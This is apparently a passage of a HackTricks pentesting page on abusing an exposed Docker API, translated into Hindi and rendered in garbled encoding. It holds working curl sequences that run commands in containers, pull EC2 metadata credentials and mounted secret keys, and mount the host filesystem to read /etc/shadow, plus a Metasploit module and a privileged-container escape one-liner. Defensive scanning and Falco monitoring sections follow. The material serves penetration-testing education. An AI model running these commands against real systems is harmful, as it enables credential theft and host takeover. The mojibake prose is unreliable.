рдХрднреА-рдХрднреА рдЖрдк **TLS** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП **2376** рдХреЛ рд╕рдХреНрд░рд┐рдп рджреЗрдЦреЗрдВрдЧреЗред рдореИрдВ рдЗрд╕реЗ рдбреЙрдХрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд░рд╣рд╛ рд╣реВрдБ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдХрд░реНрд▓ рдХреЗ рд╕рд╛рде рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
```bash
#List containers
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s тАУinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itтАЩs also worth checking out services in case they are adding secrets via environment variables)
curl -s тАУinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
рдпрджрд┐ рдЖрдк рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд╡рд╣рд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬрд╣рд╛рдБ рдореИрдВрдиреЗ рдХрдорд╛рдВрдб рдХреЙрдкреА рдХрд┐рдП: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromising

In the following page you can find ways to **escape from a docker container**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЖрдк рджреВрд░рд╕реНрде рдорд╢реАрди рдореЗрдВ рдПрдХ рдХрдордЬреЛрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдорд╢реАрди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

рдпрджрд┐ рдЖрдк рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рдЬреЛ рдбреЙрдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк [**рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### рдЪрд▓ рд░рд╣реЗ Docker рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдирд╛
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
рдЪреЗрдХ рдХрд░реЗрдВ **env** (рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдЕрдиреБрднрд╛рдЧ) рд░рд╣рд╕реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдФрд░ рдЖрдк рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* рдкрд╛рд╕рд╡рд░реНрдбред
* рдЖрдИрдкреАред
* рдкреЛрд░реНрдЯред
* рдкрдеред
* рдЕрдиреНрдптАж .

рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Securing your Docker

#### Securing Docker installation and usage

* рдЖрдк рдЕрдкрдиреЗ рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `./docker-bench-security.sh`
* рдЖрдк рдЕрдкрдиреЗ рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [https://github.com/kost/dockscan](https://github.com/kost/dockscan) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* `dockscan -v unix:///var/run/docker.sock`
* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдиреЗ рдкрд░ рдХреНрдпрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдорд┐рд▓реЗрдВрдЧреЗред рдпрд╣ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рдкреНрд░рднрд╛рд╡реЛрдВ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Securing Docker Images

* рдЖрдк [https://github.com/quay/clair](https://github.com/quay/clair) рдХрд╛ docker image рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЖрдкрдХреЗ рдЕрдиреНрдп docker images рдХреЛ рд╕реНрдХреИрди рдХрд░реЗ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗред
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Securing Dockerfiles

* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ** рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред рдкреНрд░рддреНрдпреЗрдХ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдПрдХ ID рджреА рдЬрд╛рдПрдЧреА, рдЖрдк рдпрд╣рд╛рдБ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) рдкрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рдареАрдХ рдХрд┐рдпрд╛ рдЬрд╛рдПред
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (176).png>)

* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ** рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (212).png>)

* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ** рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (71).png>)

* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ** рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (501).png>)

#### Logging Suspicious activity

* рдЖрдк рдЙрдкрдХрд░рдг [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд╕рдВрджрд┐рдЧреНрдз рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдПред
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЦрдВрдб рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Falco рдПрдХ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рд╕рдВрдХрд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдирд┐рдпрдореЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ **рд╕рдВрджрд┐рдЧреНрдз рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрд╕рдиреЗ 2 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛, рдЬрд┐рдирдореЗрдВ рд╕реЗ 1 рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдерд╛, рдФрд░ рдХреБрдЫ рд╕реЗрдХрдВрдб рдмрд╛рдж рдЗрд╕рдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдПрдХ рд╢реЗрд▓ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рдерд╛ред
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Docker рдХреА рдирд┐рдЧрд░рд╛рдиреА

рдЖрдк docker рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП auditd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕рдВрджрд░реНрдн

* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)


{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
